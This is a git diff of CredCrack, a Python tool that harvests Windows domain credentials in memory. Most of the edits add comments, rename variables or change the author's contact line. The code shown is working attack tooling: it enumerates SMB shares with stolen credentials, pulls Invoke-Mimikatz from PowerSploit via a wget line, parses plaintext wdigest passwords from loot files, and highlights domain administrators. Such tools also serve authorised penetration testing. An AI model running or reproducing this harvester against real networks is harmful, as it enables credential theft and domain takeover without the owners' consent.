@@ -2,7 +2,7 @@
 
 # CredCrack - A fast and stealthy credential harvester
 # This script harvests credentials for any given IP(s) without
-# ever touching disk. Additionally, it notifies users when
+# ever touching disk. Additionally, it notifies one when
 # a domain administrator has been captured. The script is limited to 
 # systems running Windows and Powershell version 2+ 
 #
@@ -20,9 +20,10 @@
 # along with this program. If not, see <http://www.gnu.org/licenses/>.
 #
 # Author:  Jonathan Broche
-# Contact: @g0jhonny
+# Email:   jb@gojhonny.com
+# Twitter: @g0jhonny
 # Version: 1.0
-# Date:    2015-07-31
+# Date:    2015-08-09
 
 import subprocess, os, argparse, time, datetime, socket, base64, threading, Queue, hashlib, binascii, signal, sys
 from shlex import split
@@ -49,7 +50,7 @@ def setup(lhost):
 
     if not os.path.exists('/var/www/Invoke-Mimikatz.ps1'):
         print "{}[!]{} Dependency not met. Please download Invoke-Mimikatz.ps1 and store it in /var/www".format(colors.red, colors.normal)
-        print "{}[!]{} git clone https://github.com/mattifestation/PowerSploit.git\n".format(colors.red, colors.normal)
+        print "{}[!]{} wget https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -O /var/www/Invoke-Mimikatz.ps1\n".format(colors.red, colors.normal)
         return False
 
     funps = """
@@ -89,7 +90,7 @@ def setup(lhost):
 
         if 'apache2' not in apache_status:
             subprocess.Popen(split('service apache2 start'), stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
-            return True
+        return True
  
     except Exception as e:
         print "{}[!]{} Error trying to start Apache. {}".format(colors.red, colors.normal, e)
@@ -105,7 +106,7 @@ def validate(rhost):
         if socket.inet_aton(rhost):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(0.5)
-            s.connect((rhost, 445))
+            s.connect((rhost, 445)) #test if 445 is open on the remote host
             s.close()
             return True
         
@@ -125,29 +126,29 @@ def enum_shares(q, username, password, domain):
                 shares, endshares = [], []
                 rhost = q.get()
 
-                #list available shares
-                a = subprocess.Popen(split("smbclient -L //{} -U '{}/{}%{}'".format(rhost, domain, username, password)), stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+                #obtain available shares
+                process = subprocess.Popen(split("smbclient -L //{} -U '{}/{}%{}'".format(rhost, domain, username, password)), stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
 
-                for i in filter(None, a.communicate()[0].split('\n')):
-                    share = i.strip('\t')
+                for line in filter(None, process.communicate()[0].split('\n')):
+                    share = line.strip('\t')
                     if 'os=' in share.lower():
-                        os = share.split(']')[1][5:]
+                        os = share.split(']')[1][5:] #operating system
                     else:
                         if "Connection to" in share or "NetBIOS" in share or "None" in share or "------" in share: #filter bad lines
                             pass
                         else:
-                            for s in share.split(' '):
-                                if 'Printer' not in s or 'IPC' not in s and '' not in s: #no printer or ipc shares
-                                    if 'Disk' in s:
-                                        es = ' '.join(share.split(' ')[:share.split(' ').index(s)]).strip()
+                            for item in share.split(' '):
+                                if 'Printer' not in item or 'IPC' not in item and '' not in item: #no printer or ipc shares
+                                    if 'Disk' in item:
+                                        es = ' '.join(share.split(' ')[:share.split(' ').index(item)]).strip()
                                         if es not in shares: 
                                             shares.append(es)
                 
-                #test accessibility
+                #test share accessibility
                 for share in shares:
-                    a = subprocess.Popen(split("smbclient //{}/'{}' -U '{}/{}%{}' -c dir".format(rhost, share, domain, username, password)), stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+                    process = subprocess.Popen(split("smbclient //{}/'{}' -U '{}/{}%{}' -c dir".format(rhost, share, domain, username, password)), stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
 
-                    if [x for x in filter(None, a.communicate()[0].split('\n')) if "NT_STATUS" in x]:
+                    if [item for item in filter(None, process.communicate()[0].split('\n')) if "NT_STATUS" in item]: #if NT_STATUS in response => closed share/error
                         endshares.append(" CLOSED    \\\\{}\\{} ".format(rhost, share))
                     else:
                         endshares.append(" {}OPEN      \\\\{}\\{}{} ".format(colors.lightgrey, rhost, share, colors.normal))
@@ -230,17 +231,17 @@ def parse_loot():
     files = next(os.walk('/tmp/CCloot'))[2]
     credentials = []
 
-    for fi in files:
+    for fi in files: #parse all files within the CCloot directory
         with open (os.path.join('/tmp/CCloot', fi)) as f:
             lines = f.readlines()
             for i in [x for x, y in enumerate(lines) if 'wdigest' in y]:
-                if 'username' in lines[i+1].lower() and not any(x in lines[i+1].lower() for x in ['$', '(null)']):
-                    if lines[i+3][15:].rstrip() != '(null)':
+                if 'username' in lines[i+1].lower() and not any(x in lines[i+1].lower() for x in ['$', '(null)']): #if username does not have $ or null
+                    if lines[i+3][15:].rstrip() != '(null)': #if password is not null
                         domain, user, pw = lines[i+2][15:].rstrip(), lines[i+1][15:].rstrip(), lines[i+3][15:].rstrip()
-                        if [u for r, d, u, p in credentials if user in u]:
+                        if [u for r, d, u, p in credentials if user in u]: #omitting duplicate credentials
                             pass
                         else:
-                            credentials.append((fi, domain, user, pw))
+                            credentials.append((fi, domain, user, pw)) #add credentials
     return credentials
 
 #----------------------------------------#
@@ -269,6 +270,7 @@ def output(credentials, das):
                 f.write("\n " + "-" * 69 + "\n " + " CredCrack Loot \n " + "-" * 69 + "\n\n")
                 for cred in credentials:
                     if cred[2] in das:
+                        #d = domain, #u = username, #p = password
                         print "{y}[*] Host: {r} Domain: {d} User: {u}   Password: {p}{n}".format(y=colors.yellow, r=cred[0], d=cred[1], u=cred[2], p=cred[3], n=colors.normal)
                         f.write("[*] Host: {r} Domain: {d} User: {u} Password: {p} {y}-- Domain Admin{n}\n".format(r=cred[0], d=cred[1], u=cred[2], p=cred[3], y=colors.yellow, n=colors.normal))
                         da_counter+=1
@@ -307,7 +309,7 @@ def clean_up(flag, stime):
             subprocess.Popen(split('service apache2 stop'), stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
             print "{}[*]{} Done! Loot may be found under {} folder{}".format(colors.green, colors.white, dirname, colors.normal)
             print "{}[*]{} Completed in {:.1f}s\n".format(colors.blue, colors.normal, time.time()- stime)
-        else:
+        else: #script did not complete successfully
             subprocess.Popen(split('service apache2 stop'), stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
             if os.path.exists('/tmp/CCloot'):
                 rmtree('/tmp/CCloot')
@@ -383,7 +385,7 @@ def main():
                                     break
 
                     if das:
-                        for i in range(args.threads):
+                        for num in range(args.threads):
                             worker = threading.Thread(target=harvest, args=(q, args.user, args.passwd, args.domain, args.lhost))
                             worker.setDaemon(True)
                             worker.start()
